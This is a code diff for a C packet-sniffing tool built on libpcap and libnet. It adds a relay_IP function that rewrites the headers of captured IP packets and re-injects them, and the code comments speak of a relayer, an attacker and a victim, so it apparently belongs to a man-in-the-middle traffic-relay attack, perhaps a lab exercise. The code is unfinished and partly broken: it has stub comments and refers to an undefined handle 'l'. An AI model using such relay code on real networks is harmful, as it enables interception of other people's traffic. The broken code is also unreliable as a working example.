@@ -69,7 +69,39 @@ u_int32_t r_ip;
 u_int8_t *v_mac;
 u_int8_t *r_mac;
 libnet_t *ln_context;
-void relay_IP(){
+void relay_IP(const struct sniff_ethernet *ethernet, const struct sniff_ip *ip, const u_char *payload, u_int32_t payload_s){
+	// Send packet from relayer to attacker
+	printf("Sending packet from relayer to attacker\n");
+	// Construct IP header
+	if (libnet_build_ipv4 (ip->ip_len,
+    		ip->ip_tos, ip->ip_id, ip->ip_off,
+    		ip->ip_ttl, ip->ip_p, ip->ip_sum,
+    		r_ip, ip->ip_src, payload,
+    		payload_s, ln_context, 0) == -1 )
+  	{
+    		fprintf(stderr, "Error building IP header: %s\n",\
+        	libnet_geterror(l));
+    		libnet_destroy(l);
+    		exit(0);
+  	}
+	// Construct Ethernet header
+	if ( libnet_build_ethernet(ethernet->ether_shost, r_mac, ethernet->ether_type, 
+		NULL, 0, ln_context, 0) == -1 )
+  	{
+    		fprintf(stderr, "Error building Ethernet header: %s\n",\
+        	libnet_geterror(l));
+    		libnet_destroy(l);
+    		exit(EXIT_FAILURE);
+  	}
+	int bytes_written = libnet_write(ln_context);
+	if ( bytes_written != -1 )
+    		printf("%d bytes written.\n", bytes_written);
+  	else
+    		fprintf(stderr, "Error writing packet: %s\n", libnet_geterror(l));
+	
+	// Receive response from attacker to relayer
+	
+	// Send response from victim to attacker
 	
 }
 
@@ -96,7 +128,8 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 		return;
 	}
 	payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);
-	
+	ip_payload = (u_char *)(packet + SIZE_ETHERNET + size_ip);
+	ip_payload_s = header->len - (SIZE_ETHERNET + size_ip);
 	// Record source and dest addresses
 	const char *aux = inet_ntoa(ip->ip_src);
 	const char *s_ipad = strcpy((char *) malloc(strlen(aux)+1), aux);
@@ -138,6 +171,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
         printf("Ethernet type hex:%x dec:%d is an IP packet\n",
                 ntohs(eptr->ether_type),
                 ntohs(eptr->ether_type));
+	relay_IP(ethernet, ip, ip_payload, ip_payload_s);
     	}else  if (ntohs (eptr->ether_type) == ETHERTYPE_ARP)
     	{
         printf("Ethernet type hex:%x dec:%d is an ARP packet\n",
